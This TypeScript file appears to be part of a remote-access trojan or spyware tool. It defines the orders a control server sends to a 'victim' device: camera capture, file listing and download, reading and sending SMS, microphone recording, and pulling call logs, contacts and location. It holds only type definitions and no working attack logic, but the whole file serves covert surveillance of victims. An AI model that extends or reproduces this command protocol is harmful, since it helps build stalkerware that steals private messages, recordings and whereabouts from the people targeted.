import { type ServerToVictimEvents, type VictimOrder } from '../enums';

export type ServerOrderPayload =
    | {
          order: VictimOrder.CAMERA;
          extra: 'camList' | string;
      }
    | {
          order: VictimOrder.FILE_MANAGER;
          extra: 'ls' | 'dl';
          path: string;
      }
    | { order: VictimOrder.SMS; extra: 'ls' }
    | { order: VictimOrder.SMS; extra: 'sendSMS'; to: string; sms: string }
    | { order: VictimOrder.MICROPHONE; sec: number }
    | {
          order:
              | VictimOrder.CALLS
              | VictimOrder.CONTACTS
              | VictimOrder.LOCATION;
      };

export interface IServerToVictimEvents {
    [ServerToVictimEvents.VICTIM_ORDER]: (payload: ServerOrderPayload) => void;
}
